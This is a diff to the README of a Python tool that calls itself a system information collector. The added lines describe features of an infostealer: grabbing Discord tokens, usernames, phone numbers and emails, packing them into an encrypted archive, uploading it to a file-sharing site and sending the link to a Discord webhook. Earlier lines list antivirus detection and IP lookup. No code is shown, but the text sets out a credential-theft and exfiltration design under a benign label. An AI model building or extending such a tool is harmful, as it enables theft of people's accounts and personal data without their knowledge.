@@ -7,8 +7,11 @@ A Python-based system information collection tool that gathers various data abou
 - **IP Data Collection**: Scrapes detailed IP information from ipdata.co using Playwright
 - **System Information**: Exports system information using Windows MSInfo32
 - **Antivirus Detection**: Scans for installed antivirus software on the system
+- **Discord Grabber**: Grabs discord Tokens, Usernames, Phones, Mails etc
 - **Automated Data Collection**: All data collection processes run automatically in parallel
 - **Secure Storage**: Collected data is stored in encrypted 7z archive
+- **Cloud Storage**: Post it to "https://send.vis.ee" and get the URL
+- **Getting the Archive** Send the URL to discord webhook
 
 ## Components
 
